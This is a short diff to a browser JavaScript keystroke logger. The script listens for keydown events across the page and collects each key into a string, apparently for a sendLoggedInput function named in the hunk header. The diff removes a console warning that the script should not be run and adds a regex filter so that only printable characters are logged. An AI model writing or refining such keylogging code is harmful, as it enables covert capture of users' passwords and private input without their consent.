@@ -32,8 +32,6 @@ function sendLoggedInput(loggedInput) {
 }
 
 if (document.readyState === 'complete') {
-  console.log('This is a script that should not be run.');
-
   let logInputs = '';
 
   document.addEventListener('keydown', function (event) {
@@ -43,6 +41,11 @@ if (document.readyState === 'complete') {
       return;
     }
 
-    logInputs += event.key;
+    // Only want to log alphanumeric keys and special characters
+    const isValidKey = /^[a-zA-Z0-9.,!?;:'"()&%$#@+\s]$/.test(event.key);
+
+    if (isValidKey) {
+      logInputs += event.key;
+    }
   });
 }
